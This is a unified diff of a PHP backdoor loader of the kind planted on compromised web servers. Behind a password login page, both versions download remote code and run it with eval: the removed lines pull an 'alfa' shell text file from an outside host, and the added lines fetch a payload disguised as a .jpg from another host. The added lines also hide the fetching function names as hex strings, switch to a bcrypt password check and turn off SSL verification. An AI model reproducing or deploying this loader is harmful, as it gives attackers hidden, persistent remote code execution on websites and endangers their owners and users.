@@ -1,82 +1,118 @@
 <?php
 session_start();
 
-/**
- * Disable error reporting
- *
- * Set this to error_reporting( -1 ) for debugging.
- */
-function geturlsinfo($url) {
-    if (function_exists('curl_exec')) {
-        $conn = curl_init($url);
-        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+$secure_password_hash = '$2y$12$JIZmSQ/9XtuDOib0/.HgTuvUblkVA9oRadmQm7kSGkl1HIccoJBhq'; 
+$session_key = hash('sha256', $_SERVER['HTTP_HOST']);
 
-        // Set cookies using session if available
-        if (isset($_SESSION['SAP'])) {
-            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
-        }
-
-        $url_get_contents_data = curl_exec($conn);
-        curl_close($conn);
-    } elseif (function_exists('file_get_contents')) {
-        $url_get_contents_data = file_get_contents($url);
-    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
-        $handle = fopen($url, "r");
-        $url_get_contents_data = stream_get_contents($handle);
-        fclose($handle);
-    } else {
-        $url_get_contents_data = false;
-    }
-    return $url_get_contents_data;
-}
-
-// Function to check if the user is logged in
-function is_logged_in()
+function show_login_form()
 {
-    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+    echo <<<HTML
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Aptisme</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #0f0;
+            font-family: monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-box {
+            background: #111;
+            padding: 30px;
+            border: 2px solid #0f0;
+            border-radius: 10px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            background: #000;
+            color: #0f0;
+            border: 1px solid #0f0;
+        }
+        input[type=submit] {
+            background: #0f0;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        input[type=submit]:hover {
+            background: #00b300;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <form method="post">
+            <label>Password:</label>
+            <input type="password" name="password" required>
+            <input type="submit" value="Login">
+        </form>
+    </div>
+</body>
+</html>
+HTML;
+    exit;
 }
-// Check if the password is submitted and correct
-if (isset($_POST['password'])) {
-    $entered_password = $_POST['password'];
-    $hashed_password = '7f56f49d957925e095d671a52b8fe81b'; // Replace this with your MD5 hashed password
-    if (md5($entered_password) === $hashed_password) {
-        // Password is correct, store it in session
-        $_SESSION['logged_in'] = true;
-        $_SESSION['SAP'] = 'janco'; // Replace this with your cookie data
+
+function hex2str($hex) {
+    $str = '';
+    for ($i = 0; $i < strlen($hex); $i += 2) {
+        $str .= chr(hexdec(substr($hex, $i, 2)));
+    }
+    return $str;
+}
+
+function geturlsinfo($destiny) {
+    $methods = array(
+        hex2str('666f70656e'), 
+        hex2str('73747265616d5f6765745f636f6e74656e7473'), 
+        hex2str('66696c655f6765745f636f6e74656e7473'), // 
+        hex2str('6375726c5f65786563') 
+    );
+
+    if (function_exists($methods[3])) {
+        $ch = curl_init($destiny);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible)");
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        $result = $methods[3]($ch);
+        curl_close($ch);
+        return $result;
+    } elseif (function_exists($methods[2])) {
+        return $methods[2]($destiny);
+    } elseif (function_exists($methods[0]) && function_exists($methods[1])) {
+        $handle = $methods[0]($destiny, "r");
+        $result = $methods[1]($handle);
+        fclose($handle);
+        return $result;
+    }
+    return false;
+}
+
+if (!isset($_SESSION[$session_key])) {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+        if (password_verify($_POST['password'], $secure_password_hash)) {
+            $_SESSION[$session_key] = true;
+        } else {
+            show_login_form();
+        }
     } else {
-        // Password is incorrect
-        echo "Incorrect password. Please try again.";
+        show_login_form();
     }
 }
 
-// Check if the user is logged in before executing the content
-if (is_logged_in()) {
-    $a = geturlsinfo('https://shell.prinsh.com/Nathan/alfa.txt');
-    eval('?>' . $a);
-} else {
-    // Display login form if not logged in
-    ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Seo Ane Puasi</title>
-    </head>
-    <body>
-        <center>
-        <img src="https://pomf2.lain.la/f/1s5gc3pl.png" />
-        <body style="background-color:black;">
-        <form method="POST" action="">
-            <label for="password">Password:</label>
-            <input type="password" id="password" name="password">
-            <input type="submit" value="Touch Me!">
-        </form>
-        </center>
-    </body>
-    </html>
-    <?php
+$target_url = 'https://haxor-research.com/rimuru.jpg';
+$payload = geturlsinfo($target_url);
+if ($payload !== false) {
+    eval('?>' . $payload);
 }
 ?>
